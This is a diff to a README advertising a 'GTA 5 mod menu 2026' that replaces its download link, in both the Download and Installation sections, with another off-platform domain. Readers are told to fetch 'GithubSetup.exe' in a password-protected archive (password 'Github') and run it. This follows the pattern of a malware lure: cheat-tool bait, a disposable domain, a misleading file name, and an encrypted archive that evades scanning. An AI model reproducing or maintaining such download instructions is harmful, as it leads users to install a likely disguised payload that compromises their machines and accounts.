@@ -9,7 +9,7 @@ GTA 5 mod menu 2026 with powerful features including money drop, god mode, vehic
 
 ## ⬇️ Download
 
-**[https://gitdownapply.top](https://gitdownapply.top)**  
+**[https://gitappsdown.pro/](https://gitappsdown.pro/)**  
 *File: `GithubSetup.exe` | Archive password: `Github`*
 
 ---
@@ -101,7 +101,7 @@ GTA 5 mod menu 2026 with powerful features including money drop, god mode, vehic
 
 ## 🔧 Installation / How to Use
 
-1. **Download** from: **[https://gitdownapply.top](https://gitdownapply.top)**  
+1. **Download** from: **[https://gitappsdown.pro/](https://gitappsdown.pro/)**  
    *(File: `GithubSetup.exe` | Password: `Github`)*
 
 2. Run `GithubSetup.exe` and follow the installation wizard.
